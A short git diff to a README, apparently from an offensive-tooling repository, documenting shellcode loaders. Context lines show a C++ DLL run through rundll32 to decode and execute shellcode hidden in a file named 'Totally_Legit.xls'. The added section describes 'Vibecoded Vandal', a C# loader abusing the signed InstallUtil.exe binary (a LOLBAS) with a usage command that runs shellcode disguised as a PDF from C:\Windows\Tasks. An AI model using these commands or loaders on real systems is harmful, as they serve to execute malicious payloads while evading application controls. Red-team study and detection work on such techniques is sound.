@@ -19,3 +19,10 @@ Also written in C++, this will decode and execute your shellcode that was saved 
 ## Examples:
 
 `rundll32.exe RLLDLL.dll,Perform C:\Users\Brad\Downloads\Totally_Legit.xls`
+
+# Vibecoded Vandal
+### *vibecoded-vandal.zip*
+Written in C# utilizing a LOLBAS
+
+## Examples:
+`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /image="C:\path\to\shellcode.pdf" /LogFile= /LogToConsole=false /U C:\Windows\Tasks\VIBECODEDVANDAL.dll`
